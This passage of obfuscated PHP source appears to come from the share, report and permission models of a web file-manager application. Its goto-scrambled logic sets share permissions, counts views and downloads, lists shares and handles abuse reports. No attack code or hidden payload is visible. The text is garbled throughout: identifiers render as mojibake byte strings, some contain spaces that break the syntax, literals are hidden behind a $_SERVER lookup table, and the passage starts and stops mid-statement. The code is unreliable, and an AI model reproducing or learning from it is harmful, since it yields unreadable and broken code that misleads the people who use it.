$CÊ‰ñÀÌ¥[2231] => $CÊ‰ñÀÌ¥[33], $CÊ‰ñÀÌ¥[443] => $CÊ‰ñÀÌ¥[33]); $B ÛÜšœÛí = explode($CÊ‰ñÀÌ¥[47], $CÊ‰ñÀÌ¥[2232]); foreach ($B ÛÜšœÛí as $FÉ„Ìßõ·‚) { if (!isset($DçÍŞºã¼×[$FÉ„Ìßõ·‚])) { continue; } $bÓŠëÚ™óğ[$FÉ„Ìßõ·‚] = $DçÍŞºã¼×[$FÉ„Ìßõ·‚]; } goto B¨ƒ—š¸‹í; Eˆ£¢›­˜Ø: if ($DÅ£Ùâ¤Ñ = $this->where($d’‚Ò¨ÏÎ)->find()) { return $DÅ£Ùâ¤Ñ[$CÊ‰ñÀÌ¥[441]]; } if ($eÃ‹Ò‘½×‰ == 0) { $Aö´®›”ó© = array($CÊ‰ñÀÌ¥[28] => get_path_this($DçÍŞºã¼×[$CÊ‰ñÀÌ¥[75]])); } else { $Aö´®›”ó© = Model($CÊ‰ñÀÌ¥[754])->sourceInfo($eÃ‹Ò‘½×‰); if (!$Aö´®›”ó©) { return !1; } } if (!$DçÍŞºã¼×[$CÊ‰ñÀÌ¥[1344]]) { $DçÍŞºã¼×[$CÊ‰ñÀÌ¥[1344]] = $Aö´®›”ó©[$CÊ‰ñÀÌ¥[28]]; } goto aõÒÛÎ‡Ë©; fî‚ÂÍØ: $CÊ‰ñÀÌ¥ =& $_SERVER[”Ì÷ñ­î¸]; $d’‚Ò¨ÏÎ = array($CÊ‰ñÀÌ¥[383] => $eÃ‹Ò‘½×‰, $CÊ‰ñÀÌ¥[1430] => USER_ID); if ($eÃ‹Ò‘½×‰ == 0) { $d’‚Ò¨ÏÎ = array($CÊ‰ñÀÌ¥[2228] => $DçÍŞºã¼×[$CÊ‰ñÀÌ¥[1018]], $CÊ‰ñÀÌ¥[1430] => USER_ID); } goto Eˆ£¢›­˜Ø; Aâ”ÖÆÄÁ…: } private function _shareAuthSet($A–÷¥†™Ä, $cˆøòÁÏÓë) { goto D¢ŒŒªÜ•¤; A«÷…„ŞÚ: return $Cæ½À°æçƒ->addAll($Aù‰Êàïˆã, array(), !0); goto F¬ëŒ·¡ó†; D¢ŒŒªÜ•¤: $d³°‰“§¬Ü =& $_SERVER[”Ì÷ñ­î¸]; if (!is_array($cˆøòÁÏÓë)) { return !1; } $Cæ½À°æçƒ = Model($d³°‰“§¬Ü[2233]); goto ağœöÓ; ağœöÓ: $Cæ½À°æçƒ->where(array($d³°‰“§¬Ü[441] => $A–÷¥†™Ä))->delete(); $Aù‰Êàïˆã = array(); foreach ($cˆøòÁÏÓë as $B‚Ñî¶™Å) { $c¯£ƒÅŞ¶‰ = SourceModel::TYPE_USER; if ($B‚Ñî¶™Å[$d³°‰“§¬Ü[371]] == SourceModel::TYPE_GROUP) { $c¯£ƒÅŞ¶‰ = SourceModel::TYPE_GROUP; } $Dõˆˆ‡¸¥Ü = array($d³°‰“§¬Ü[441] => $A–÷¥†™Ä, $d³°‰“§¬Ü[371] => $c¯£ƒÅŞ¶‰, $d³°‰“§¬Ü[456] => intval($B‚Ñî¶™Å[$d³°‰“§¬Ü[456]]), $d³°‰“§¬Ü[2234] => 0, $d³°‰“§¬Ü[2235] => -1); if ($B‚Ñî¶™Å[$d³°‰“§¬Ü[2234]]) { $Dõˆˆ‡¸¥Ü[$d³°‰“§¬Ü[2234]] = $B‚Ñî¶™Å[$d³°‰“§¬Ü[2234]]; } else { if ($B‚Ñî¶™Å[$d³°‰“§¬Ü[2235]]) { $Dõˆˆ‡¸¥Ü[$d³°‰“§¬Ü[2235]] = $B‚Ñî¶™Å[$d³°‰“§¬Ü[2235]]; } } $Aù‰Êàïˆã[] = $Dõˆˆ‡¸¥Ü; } goto A«÷…„ŞÚ; F¬ëŒ·¡ó†: } public function numViewAdd($d˜¤º§ÅèĞ) { $bö©Å‚Š·ø =& $_SERVER[”Ì÷ñ­î¸]; $CÇ¡‚‘»”” = array($bö©Å‚Š·ø[440] => $d˜¤º§ÅèĞ); $this->where($CÇ¡‚‘»””)->setAdd($bö©Å‚Š·ø[2229]); } public function numDownloadAdd($c”Ê§‡Õ´”) { $d¡šÊ´Ü  =& $_SERVER[”Ì÷ñ­î¸]; $fèç­íŒİ… = array($d¡šÊ´Ü [440] => $c”Ê§‡Õ´”); $this->where($fèç­íŒİ…)->setAdd($d¡šÊ´Ü [2230]); } protected function shareEdit($d±ªÇ§Ïï, $E‡äçÈí–Ä) { goto Bï”ŞÙìÇì; B‰¿¶±‰’: foreach ($FÔñÆÎÎå as $D…‡ëœÄ˜) { if (!array_key_exists($D…‡ëœÄ˜, $E‡äçÈí–Ä)) { continue; } $còğÒ±Š‰[$D…‡ëœÄ˜] = $E‡äçÈí–Ä[$D…‡ëœÄ˜]; } $this->shareEventAdd($CÂøÒ­‰Ã[$DööæÍ··‰[369]], $E‡äçÈí–Ä, $DööæÍ··‰[2074]); $this->where(array($DööæÍ··‰[440] => $d±ªÇ§Ïï))->save($còğÒ±Š‰); goto F‡¢ÀòÅ„; F‡¢ÀòÅ„: if (isset($E‡äçÈí–Ä[$DööæÍ··‰[2222]])) { $this->_shareAuthSet($d±ªÇ§Ïï, $E‡äçÈí–Ä[$DööæÍ··‰[2222]]); } return !0; goto Eï™¸¶‰Á; Bï”ŞÙìÇì: $DööæÍ··‰ =& $_SERVER[”Ì÷ñ­î¸]; $CÂøÒ­‰Ã = $this->getInfo($d±ªÇ§Ïï); if (!$CÂøÒ­‰Ã) { return !1; } goto E‘ò»Şë®; E‘ò»Şë®: $this->_checkLinkShare($E‡äçÈí–Ä, $CÂøÒ­‰Ã); $còğÒ±Š‰ = array(); $FÔñÆÎÎå = explode($DööæÍ··‰[47], $DööæÍ··‰[2236]); goto B‰¿¶±‰’; Eï™¸¶‰Á: } private function _checkLinkShare($dçœ¹ƒÈ£ø, $F•ìåÉ Œª) { goto C£…Îõ‹Ÿ¬; C£…Îõ‹Ÿ¬: $E‹“«¥Ğßó =& $_SERVER[”Ì÷ñ­î¸]; if ($dçœ¹ƒÈ£ø[$E‹“«¥Ğßó[446]] != $E‹“«¥Ğßó[83]) { return; } $C£¨òîÀ = $F•ìåÉ Œª[$E‹“«¥Ğßó[391]][$E‹“«¥Ğßó[369]]; goto c¶¶õ·«×İ; BÂÄĞˆ½: $bğÓ¼èÕÀô = $this->shareFileMeta($c¼İà³é¥Û[$E‹“«¥Ğßó[419]]); if (isset($bğÓ¼èÕÀô[$E‹“«¥Ğßó[359]]) && $bğÓ¼èÕÀô[$E‹“«¥Ğßó[359]] == $E‹“«¥Ğßó[83]) { show_json(LNG($E‹“«¥Ğßó[2239]), !1); } goto CŸ¢¾¼öÉ»; c¶¶õ·«×İ: if ($F•ìåÉ Œª[$E‹“«¥Ğßó[391]][$E‹“«¥Ğßó[29]] != $E‹“«¥Ğßó[167]) { $f÷ë–×¶ô = $this->_folderReport($C£¨òîÀ); if (!$f÷ë–×¶ô) { return; } show_json(LNG($E‹“«¥Ğßó[2237]) . $E‹“«¥Ğßó[2238] . $f÷ë–×¶ô, !1); } $c¼İà³é¥Û = Model($E‹“«¥Ğßó[754])->fileInfoGet($F•ìåÉ Œª[$E‹“«¥Ğßó[391]][$E‹“«¥Ğßó[369]]); if (!$c¼İà³é¥Û) { return; } goto BÂÄĞˆ½; CŸ¢¾¼öÉ»: } private function _folderReport($A ÊâÉ§ß‰) { goto eÅ£ËİŒŠì; dŞâ·á‚¶á: $B¯øğø‘ßœ = array_to_keyvalue($Bˆ…õÏÀñ©, $fÆ¾ù´ğÛö[33], $fÆ¾ù´ğÛö[28]); $B¯øğø‘ßœ[] = $Bš¾‘Î˜ç[$fÆ¾ù´ğÛö[28]]; return implode($fÆ¾ù´ğÛö[8], $B¯øğø‘ßœ); goto aŒÑÌ×—ç; eÅ£ËİŒŠì: $fÆ¾ù´ğÛö =& $_SERVER[”Ì÷ñ­î¸]; $eƒù½—‰—± = array($fÆ¾ù´ğÛö[419] => array($fÆ¾ù´ğÛö[928], 0), $fÆ¾ù´ğÛö[690] => 3); $Fîò»÷ñ’† = Model($fÆ¾ù´ğÛö[2240])->where($eƒù½—‰—±)->field($fÆ¾ù´ğÛö[419])->select(); goto B¹Í‚ù“ï™; b†£¯ˆ›í: $eƒù½—‰—± = array($fÆ¾ù´ğÛö[419] => array($fÆ¾ù´ğÛö[7], $Fîò»÷ñ’†), $fÆ¾ù´ğÛö[459] => array($fÆ¾ù´ğÛö[753], "\x25{$dè¦Ÿ‚•â}\45"), $fÆ¾ù´ğÛö[397] => 0); $Bš¾‘Î˜ç = Model($fÆ¾ù´ğÛö[754])->where($eƒù½—‰—±)->field($fÆ¾ù´ğÛö[2241])->find(); if (!$Bš¾‘Î˜ç) { return !1; } goto Dİ°ëœ¨½§; Dİ°ëœ¨½§: $dÏ™½ÄŠ‚¦ = substr($Bš¾‘Î˜ç[$fÆ¾ù´ğÛö[459]], strpos($Bš¾‘Î˜ç[$fÆ¾ù´ğÛö[459]], $dè¦Ÿ‚•â)); $eƒù½—‰—± = array($fÆ¾ù´ğÛö[369] => array($fÆ¾ù´ğÛö[7], trim($dÏ™½ÄŠ‚¦, $fÆ¾ù´ğÛö[47]))); $Bˆ…õÏÀñ© = Model($fÆ¾ù´ğÛö[754])->where($eƒù½—‰—±)->field($fÆ¾ù´ğÛö[28])->select(); goto dŞâ·á‚¶á; B¹Í‚ù“ï™: if (!$Fîò»÷ñ’†) { return !1; } $Fîò»÷ñ’† = array_to_keyvalue($Fîò»÷ñ’†, $fÆ¾ù´ğÛö[33], $fÆ¾ù´ğÛö[419]); $dè¦Ÿ‚•â = $fÆ¾ù´ğÛö[47] . $A ÊâÉ§ß‰ . $fÆ¾ù´ğÛö[47]; goto b†£¯ˆ›í; aŒÑÌ×—ç: } protected function remove($D­ÑÚù¬ô—) { goto EĞõ·Ô…¤•; Aáİ•ÍÕÃ: for ($AæÊéçù†² = 0; $AæÊéçù†² < count($AÇ¤åğ»¡Ù); $AæÊéçù†²++) { $BÖ›Ú“ß¥í = $this->getInfo($AÇ¤åğ»¡Ù[$AæÊéçù†²]); if ($BÖ›Ú“ß¥í[$bİìĞƒÉîÑ[448]] == $bİìĞƒÉîÑ[83]) { Model($bİìĞƒÉîÑ[505])->eventShare($BÖ›Ú“ß¥í[$bİìĞƒÉîÑ[369]], $bİìĞƒÉîÑ[2227]); } if ($BÖ›Ú“ß¥í[$bİìĞƒÉîÑ[446]] == $bİìĞƒÉîÑ[83]) { Model($bİìĞƒÉîÑ[505])->eventShare($BÖ›Ú“ß¥í[$bİìĞƒÉîÑ[369]], $bİìĞƒÉîÑ[2226]); } } return $B–Æèã§ø«; goto fÍ™’ì¨Ÿ; EĞõ·Ô…¤•: $bİìĞƒÉîÑ =& $_SERVER[”Ì÷ñ­î¸]; if (is_array($D­ÑÚù¬ô—)) { $D­ÑÚù¬ô— = array($bİìĞƒÉîÑ[7], $D­ÑÚù¬ô—); } $BÈˆæÖ¾½ì = array($bİìĞƒÉîÑ[441] => $D­ÑÚù¬ô—); goto fŠÀåÈ¤Ù¥; fŠÀåÈ¤Ù¥: $B–Æèã§ø« = $this->where($BÈˆæÖ¾½ì)->delete(); if ($B–Æèã§ø«) { Model($bİìĞƒÉîÑ[537])->where(array($bİìĞƒÉîÑ[441] => $D­ÑÚù¬ô—))->delete(); } $AÇ¤åğ»¡Ù = is_array($D­ÑÚù¬ô—) ? $D­ÑÚù¬ô—[1] : array($D­ÑÚù¬ô—); goto Aáİ•ÍÕÃ; fÍ™’ì¨Ÿ: } protected function removeBySource($dÒ‘†©ç£) { goto c‹²…É©¢‹; aƒĞ«¯ë: $B¼öŸŸ‚Æ¾ = array_to_keyvalue($B¼öŸŸ‚Æ¾, $Fëå©£ò·é[33], $Fëå©£ò·é[441]); if (!$B¼öŸŸ‚Æ¾) { return; } $AÍ‡ÙÜÂ×‹ = array($Fëå©£ò·é[440] => array($Fëå©£ò·é[384], $B¼öŸŸ‚Æ¾)); goto f£ºˆ×÷İè; f£ºˆ×÷İè: $this->where($AÍ‡ÙÜÂ×‹)->delete(); Model($Fëå©£ò·é[537])->where($AÍ‡ÙÜÂ×‹)->delete(); goto Aã†ğÁÑî; c‹²…É©¢‹: $Fëå©£ò·é =& $_SERVER[”Ì÷ñ­î¸]; $AÍ‡ÙÜÂ×‹ = array($Fëå©£ò·é[383] => array($Fëå©£ò·é[384], $dÒ‘†©ç£)); $B¼öŸŸ‚Æ¾ = $this->field($Fëå©£ò·é[441])->where($AÍ‡ÙÜÂ×‹)->select(); goto aƒĞ«¯ë; Aã†ğÁÑî: } public function listAll($eæÕ¬¨åå) { goto b¢È˜¾÷×î; b¢È˜¾÷×î: $A”·ò†Ç =& $_SERVER[”Ì÷ñ­î¸]; $föæÍœñ›£ = array(); if ($eæÕ¬¨åå[$A”·ò†Ç[1439]]) { $föæÍœñ›£[$A”·ò†Ç[1439]] = $eæÕ¬¨åå[$A”·ò†Ç[1439]]; } goto AàêØ¤­¦‘; AàêØ¤­¦‘: if ($eæÕ¬¨åå[$A”·ò†Ç[703]]) { $c—«¬°…Æ = $eæÕ¬¨åå[$A”·ò†Ç[704]] ? $eæÕ¬¨åå[$A”·ò†Ç[704]] : strtotime(date($A”·ò†Ç[2242])); $föæÍœñ›£[$A”·ò†Ç[187]] = array($A”·ò†Ç[321], array($eæÕ¬¨åå[$A”·ò†Ç[703]], $c—«¬°…Æ)); } if ($eæÕ¬¨åå[$A”·ò†Ç[29]]) { $föæÍœñ›£[$eæÕ¬¨åå[$A”·ò†Ç[29]]] = 1; } else { $föæÍœñ›£[] = array($A”·ò†Ç[446] => array($A”·ò†Ç[928], 0), $A”·ò†Ç[448] => array($A”·ò†Ç[928], 0), $A”·ò†Ç[2217] => $A”·ò†Ç[2186]); } if ($eæÕ¬¨åå[$A”·ò†Ç[2182]]) { $föæÍœñ›£[] = array($A”·ò†Ç[443] => $eæÕ¬¨åå[$A”·ò†Ç[2182]], $A”·ò†Ç[1344] => array($A”·ò†Ç[753], "\x25{$eæÕ¬¨åå[$A”·ò†Ç[2182]]}\x25"), $A”·ò†Ç[2217] => $A”·ò†Ç[2186]); } goto c¨¾†šÅ·º; c¨¾†šÅ·º: $bœìºÑ‘Ù = $this->_makeOrder()->where($föæÍœñ›£)->selectPage(20); if (empty($bœìºÑ‘Ù[$A”·ò†Ç[354]])) { return array(); } $this->_listDataApply($bœìºÑ‘Ù[$A”·ò†Ç[354]]); goto BÍ…»ó¼ª‘; BÍ…»ó¼ª‘: return $bœìºÑ‘Ù; goto BïËÜØ½ï…; BïËÜØ½ï…: } public function listDataApply($E·½³ö²Š§) { $this->_listDataApply($E·½³ö²Š§); return $E·½³ö²Š§; } private function _listDataApply(&$eï¥ãŠ) { $a…ù”¼×İ =& $_SERVER[”Ì÷ñ­î¸]; $E‚†ÒŞØì– = array_to_keyvalue($eï¥ãŠ, $a…ù”¼×İ[33], $a…ù”¼×İ[1439]); $e‡äÀ¦ùÙÖ = Model($a…ù”¼×İ[477])->userListInfo(array_unique($E‚†ÒŞØì–)); $Bº˜¡ùô“¼ = array_to_keyvalue($eï¥ãŠ, $a…ù”¼×İ[33], $a…ù”¼×İ[369]); $B×¥Æ”›ˆ = Model($a…ù”¼×İ[754])->sourceListInfo($Bº˜¡ùô“¼, !0); foreach ($eï¥ãŠ as &$D‚ó‰˜ê¼Ş) { $a‚ÔÀ…»•Ì = $D‚ó‰˜ê¼Ş[$a…ù”¼×İ[1439]]; $D‚ó‰˜ê¼Ş[$a…ù”¼×İ[2243]] = $e‡äÀ¦ùÙÖ[$a‚ÔÀ…»•Ì] ? $e‡äÀ¦ùÙÖ[$a‚ÔÀ…»•Ì] : !1; $c®Şòµ„ŸÛ = $D‚ó‰˜ê¼Ş[$a…ù”¼×İ[369]]; $D‚ó‰˜ê¼Ş[$a…ù”¼×İ[391]] = $B×¥Æ”›ˆ[$c®Şòµ„ŸÛ] ? $B×¥Æ”›ˆ[$c®Şòµ„ŸÛ] : !1; } } private function _makeOrder($Cí ï›¿ = '') { goto FÍÀÙ‚í›Ç; FÍÀÙ‚í›Ç: $bíÈåŒ›¡¦ =& $_SERVER[”Ì÷ñ­î¸]; $eˆÊ¦ÇîÑ = array($bíÈåŒ›¡¦[187], $bíÈåŒ›¡¦[704], $bíÈåŒ›¡¦[2229], $bíÈåŒ›¡¦[2230]); $d¶Šù’ô ” = array($bíÈåŒ›¡¦[402] => $bíÈåŒ›¡¦[403], $bíÈåŒ›¡¦[404] => $bíÈåŒ›¡¦[405]); goto Dºçâ¢È«ç; Dºçâ¢È«ç: $DåğÃÌğ‹Ğ = Input::get($bíÈåŒ›¡¦[407], $bíÈåŒ›¡¦[7], $bíÈåŒ›¡¦[389], $eˆÊ¦ÇîÑ); $eå®Ó¦ÁŞµ = Input::get($bíÈåŒ›¡¦[408], $bíÈåŒ›¡¦[7], $bíÈåŒ›¡¦[2244], array($bíÈåŒ›¡¦[2181], $bíÈåŒ›¡¦[404])); $eå®Ó¦ÁŞµ = $d¶Šù’ô ”[$eå®Ó¦ÁŞµ]; goto b®ÔØÙò£Ë; b®ÔØÙò£Ë: $Cí ï›¿ = $Cí ï›¿ . "{$DåğÃÌğ‹Ğ}\40{$eå®Ó¦ÁŞµ}"; return $this->order($Cí ï›¿); goto a•”É›…®; a•”É›…®: } public function reportAdd($DğÌ‘‘Ç¾) { $c‰†á»™æ =& $_SERVER[”Ì÷ñ­î¸]; $Dˆ«¡÷”ÒĞ = array($c‰†á»™æ[441] => $DğÌ‘‘Ç¾[$c‰†á»™æ[441]], $c‰†á»™æ[1439] => USER_ID); if (Model($c‰†á»™æ[2240])->where($Dˆ«¡÷”ÒĞ)->find()) { return !1; } $fô…‰¾² = array($c‰†á»™æ[441] => $DğÌ‘‘Ç¾[$c‰†á»™æ[441]], $c‰†á»™æ[1344] => $DğÌ‘‘Ç¾[$c‰†á»™æ[1344]], $c‰†á»™æ[369] => $DğÌ‘‘Ç¾[$c‰†á»™æ[369]], $c‰†á»™æ[419] => $DğÌ‘‘Ç¾[$c‰†á»™æ[419]], $c‰†á»™æ[1439] => USER_ID, $c‰†á»™æ[29] => $DğÌ‘‘Ç¾[$c‰†á»™æ[29]], $c‰†á»™æ[405] => $DğÌ‘‘Ç¾[$c‰†á»™æ[405]]); return Model($c‰†á»™æ[2240])->add($fô…‰¾²); } public function reportList($aœ¼Õß“ô) { goto bÛ—¾Ë¦«; D±Å”÷†°‚: $Dí«œë× = array($CË¦Ààä„”[402] => $CË¦Ààä„”[403], $CË¦Ààä„”[404] => $CË¦Ààä„”[405]); $d¤Ò¬ĞŒã = $CË¦Ààä„”[2248] . $Dí«œë×[$AÒ—©•ÕŞá]; $dŠöæ…ÃÀõ = Model($CË¦Ààä„”[2240])->where($bÉš³¥Ò÷í)->order($d¤Ò¬ĞŒã)->selectPage(20); goto a¦ÙÛ’¥ø; bÛ—¾Ë¦«: $CË¦Ààä„” =& $_SERVER[”Ì÷ñ­î¸]; $bÉš³¥Ò÷í = array(); if ($aœ¼Õß“ô[$CË¦Ààä„”[703]]) { $cÓèæ¥’Ÿ = $aœ¼Õß“ô[$CË¦Ààä„”[704]] ? $aœ¼Õß“ô[$CË¦Ààä„”[704]] : strtotime(date($CË¦Ààä„”[2242])); $bÉš³¥Ò÷í[$CË¦Ààä„”[187]] = array($CË¦Ààä„”[321], array($aœ¼Õß“ô[$CË¦Ààä„”[703]], $cÓèæ¥’Ÿ)); } goto F‘Ø½”©À; a¦ÙÛ’¥ø: if (empty($dŠöæ…ÃÀõ[$CË¦Ààä„”[354]])) { return array(); } $this->_listDataApply($dŠöæ…ÃÀõ[$CË¦Ààä„”[354]]); return $dŠöæ…ÃÀõ; goto BºÀ„àÃ¾™; F‘Ø½”©À: if (isset($aœ¼Õß“ô[$CË¦Ààä„”[29]]) && in_array($aœ¼Õß“ô[$CË¦Ààä„”[29]], array($CË¦Ààä„”[83], $CË¦Ààä„”[2245], $CË¦Ààä„”[2246], $CË¦Ààä„”[2247], $CË¦Ààä„”[1922]))) { $bÉš³¥Ò÷í[$CË¦Ààä„”[29]] = $aœ¼Õß“ô[$CË¦Ààä„”[29]]; } if (isset($aœ¼Õß“ô[$CË¦Ààä„”[690]]) && in_array($aœ¼Õß“ô[$CË¦Ààä„”[690]], array($CË¦Ààä„”[468], $CË¦Ààä„”[83], $CË¦Ààä„”[2245], $CË¦Ààä„”[2246]))) { $bÉš³¥Ò÷í[$CË¦Ààä„”[690]] = $aœ¼Õß“ô[$CË¦Ààä„”[690]]; } $AÒ—©•ÕŞá = Input::get($CË¦Ààä„”[408], $CË¦Ààä„”[7], $CË¦Ààä„”[2244], array($CË¦Ààä„”[2181], $CË¦Ààä„”[404])); goto D±Å”÷†°‚; BºÀ„àÃ¾™: } public function reportStatus($fé†·à«) { goto bÛ¶Ìæ¾ˆ; FÜï×Ü·Î: return $d²ÂœˆâÑ; goto A©ÓãÃš¹; aòä˜ÁïâÁ: $d²ÂœˆâÑ = Model($D‚ÈÑ¿Ä§[2240])->where($cŠ”¾òĞ“)->save($B¶ùë´Ö); if ($fé†·à«[$D‚ÈÑ¿Ä§[690]] == $D‚ÈÑ¿Ä§[2245]) { if ($Aè§³ª›¡˜[$D‚ÈÑ¿Ä§[419]] != $D‚ÈÑ¿Ä§[468] && $this->shareFileMeta($Aè§³ª›¡˜[$D‚ÈÑ¿Ä§[419]])) { $this->shareFileMeta($Aè§³ª›¡˜[$D‚ÈÑ¿Ä§[419]], 0); } $this->remove($Aè§³ª›¡˜[$D‚ÈÑ¿Ä§[441]]); return !0; } if ($d²ÂœˆâÑ && $fé†·à«[$D‚ÈÑ¿Ä§[690]] == $D‚ÈÑ¿Ä§[2246]) { $E‰ƒ«±¡ĞŒ = $B¶ùë´Ö[$D‚ÈÑ¿Ä§[690]] == $D‚ÈÑ¿Ä§[2246] ? 1 : 0; $this->shareFileMeta($Aè§³ª›¡˜[$D‚ÈÑ¿Ä§[419]], $E‰ƒ«±¡ĞŒ); $this->removeByFile($Aè§³ª›¡˜[$D‚ÈÑ¿Ä§[419]]); } goto FÜï×Ü·Î; bÛ¶Ìæ¾ˆ: $D‚ÈÑ¿Ä§ =& $_SERVER[”Ì÷ñ­î¸]; $cŠ”¾òĞ“ = array($D‚ÈÑ¿Ä§[367] => $fé†·à«[$D‚ÈÑ¿Ä§[367]]); $Aè§³ª›¡˜ = Model($D‚ÈÑ¿Ä§[2240])->where($cŠ”¾òĞ“)->field($D‚ÈÑ¿Ä§[2249])->find(); goto eÊÅ‡ø¥­â; eÊÅ‡ø¥­â: if (!$Aè§³ª›¡˜) { return !1; } $B¶ùë´Ö = array($D‚ÈÑ¿Ä§[690] => $fé†·à«[$D‚ÈÑ¿Ä§[690]]); if ($fé†·à«[$D‚ÈÑ¿Ä§[690]] == $D‚ÈÑ¿Ä§[2246] && $Aè§³ª›¡˜[$D‚ÈÑ¿Ä§[690]] == $D‚ÈÑ¿Ä§[2246]) { $B¶ùë´Ö[$D‚ÈÑ¿Ä§[690]] = 0; } goto aòä˜ÁïâÁ; A©ÓãÃš¹: } private function removeByFile($b„¾Ô±šÅ) { goto f•½İİÜö; BäÌ—® ‰£: $b¬Ì¨î•ÁŠ = array_to_keyvalue($b¼ß÷Ñš‡, $C¬¯¡áÑÈî[33], $C¬¯¡áÑÈî[441]); $this->remove($b¬Ì¨î•ÁŠ); goto f×¥“ƒŠ‰—; f•½İİÜö: $C¬¯¡áÑÈî =& $_SERVER[”Ì÷ñ­î¸]; $b¼ß÷Ñš‡ = Model($C¬¯¡áÑÈî[754])->where(array($C¬¯¡áÑÈî[419] => $b„¾Ô±šÅ))->field($C¬¯¡áÑÈî[369])->select(); $dÎíïğ±ã = array_to_keyvalue($b¼ß÷Ñš‡, $C¬¯¡áÑÈî[33], $C¬¯¡áÑÈî[369]); goto e¿½Ï´’­±; e¿½Ï´’­±: $cª‰Ö¦ŒÂä = array($C¬¯¡áÑÈî[369] => array($C¬¯¡áÑÈî[7], $dÎíïğ±ã), $C¬¯¡áÑÈî[446] => 1); $b¼ß÷Ñš‡ = Model($C¬¯¡áÑÈî[2083])->where($cª‰Ö¦ŒÂä)->field($C¬¯¡áÑÈî[441])->select(); if (empty($b¼ß÷Ñš‡)) { return; } goto BäÌ—® ‰£; f×¥“ƒŠ‰—: } private function shareFileMeta($Bâ…Ö¡‚· , $f„æÁÜ“·» = null) { $fè’×‹ÎïÚ =& $_SERVER[”Ì÷ñ­î¸]; $eäÌËÖ¢ìÃ = array($fè’×‹ÎïÚ[419] => $Bâ…Ö¡‚· , $fè’×‹ÎïÚ[89] => $fè’×‹ÎïÚ[2250]); if (is_null($f„æÁÜ“·»)) { return Model($fè’×‹ÎïÚ[2251])->where($eäÌËÖ¢ìÃ)->find(); } $eäÌËÖ¢ìÃ[$fè’×‹ÎïÚ[359]] = $f„æÁÜ“·»; Model($fè’×‹ÎïÚ[2251])->add($eäÌËÖ¢ìÃ, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\137\x73\x6f\x75\162\143\145\137\141\x75\x74\x68"; public function getAuth($f²ôˆñùñ…) { goto aë™Ôïß½Ë; däİ§ùÍ«: return $e¥„Á‘Óœì; goto eƒ´âÚ›Œ÷; aë™Ôïß½Ë: $BÇÃÊàéÀ¥ =& $_SERVER[”Ì÷ñ­î¸]; $F¦³¦é‡Â = $BÇÃÊàéÀ¥[2252]; $C†ƒÊ¹ÔÅ = array($BÇÃÊàéÀ¥[369] => $f²ôˆñùñ…); goto BÖ›µ œÉ; BÖ›µ œÉ: $fØæëìùÒª = $this->field($F¦³¦é‡Â)->order($BÇÃÊàéÀ¥[367])->where($C†ƒÊ¹ÔÅ)->select(); $e¥„Á‘Óœì = array(); foreach ($fØæëìùÒª as $aŞĞÆÉøÀ) { if (Model($BÇÃÊàéÀ¥[2253])->listData($aŞĞÆÉøÀ[$BÇÃÊàéÀ¥[2234]])) { $e¥„Á‘Óœì[] = $aŞĞÆÉøÀ; } } goto däİ§ùÍ«; eƒ´âÚ›Œ÷: } public function setAuth($Fµ¬®œÄÎ, $CŒ–¯öĞ³á) { goto aÕ›à´ÅñÙ; aÕ›à´ÅñÙ: $Aî°öåìö‘ =& $_SERVER[”Ì÷ñ­î¸]; $AÏ˜×ŞÄ„‡ = Model($Aî°öåìö‘[1117])->sourceInfo($Fµ¬®œÄÎ); if ($AÏ˜×ŞÄ„‡[$Aî°öåìö‘[371]] != SourceModel::TYPE_GROUP) { return !1; } goto c‰§õƒâ»Õ; DÀ¢¨›Ç‘‘: $this->where(array($Aî°öåìö‘[383] => $Fµ¬®œÄÎ))->delete(); $this->addAll($BÒÔ´Ú“”); return !0; goto e¼¬£á¡²; d§›˜ÍÏÙ: $D‡–˜²Å¸ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $BÒÔ´Ú“” = array(); foreach ($CŒ–¯öĞ³á as $cÓ¿ê‘î†ö) { if (!in_array($cÓ¿ê‘î†ö[$Aî°öåìö‘[371]], $D‡–˜²Å¸)) { show_json(LNG($Aî°öåìö‘[2254]), !1); } if ($aÎÄäÏÉÂÄ != $Ešİç´¾‘š) { if ($cÓ¿ê‘î†ö[$Aî°öåìö‘[371]] == SourceModel::TYPE_GROUP) { } if ($cÓ¿ê‘î†ö[$Aî°öåìö‘[456]] != 0 && !in_array($cÓ¿ê‘î†ö[$Aî°öåìö‘[456]], $e„ˆ×²‚Ëø)) { } } if ($cÓ¿ê‘î†ö[$Aî°öåìö‘[456]] == 0) { $cÓ¿ê‘î†ö[$Aî°öåìö‘[371]] = SourceModel::TYPE_USER; } $BÒÔ´Ú“”[] = array($Aî°öåìö‘[369] => $Fµ¬®œÄÎ, $Aî°öåìö‘[371] => intval($cÓ¿ê‘î†ö[$Aî°öåìö‘[371]]), $Aî°öåìö‘[456] => intval($cÓ¿ê‘î†ö[$Aî°öåìö‘[456]]), $Aî°öåìö‘[2234] => intval($cÓ¿ê‘î†ö[$Aî°öåìö‘[2234]]) ? intval($cÓ¿ê‘î†ö[$Aî°öåìö‘[2234]]) : 0, $Aî°öåìö‘[2235] => intval($cÓ¿ê‘î†ö[$Aî°öåìö‘[2235]]) ? intval($cÓ¿ê‘î†ö[$Aî°öåìö‘[2235]]) : -1); } goto DÀ¢¨›Ç‘‘; c‰§õƒâ»Õ: $Ešİç´¾‘š = 1; $aÎÄäÏÉÂÄ = $AÏ˜×ŞÄ„‡[$Aî°öåìö‘[456]]; if ($aÎÄäÏÉÂÄ != $Ešİç´¾‘š) { $dÚ§¥ğ„Ğ = array($Aî°öåìö‘[2106] => $aÎÄäÏÉÂÄ); $e„ˆ×²‚Ëø = Model($Aî°öåìö‘[2180])->field($Aî°öåìö‘[1439])->where($dÚ§¥ğ„Ğ)->select(); $e„ˆ×²‚Ëø = array_to_keyvalue($e„ˆ×²‚Ëø, $Aî°öåìö‘[33], $Aî°öåìö‘[1439]); } goto d§›˜ÍÏÙ; e¼¬£á¡²: } public function authClear($DŒğïƒ†ä›) { $B¶Àš¸Öí =& $_SERVER[”Ì÷ñ­î¸]; $F‘”ù³ÂÄ› = Model($B¶Àš¸Öí[1117])->sourceInfo($DŒğïƒ†ä›); $fß©å¢æö¦ = array($DŒğïƒ†ä›); if ($F‘”ù³ÂÄ›[$B¶Àš¸Öí[370]] == $B¶Àš¸Öí[83]) { $FÓôİ¿¡Â¡ = array($B¶Àš¸Öí[525] => array($B¶Àš¸Öí[483], $F‘”ù³ÂÄ›[$B¶Àš¸Öí[459]] . $DŒğïƒ†ä› . $B¶Àš¸Öí[484])); $fß©å¢æö¦ = 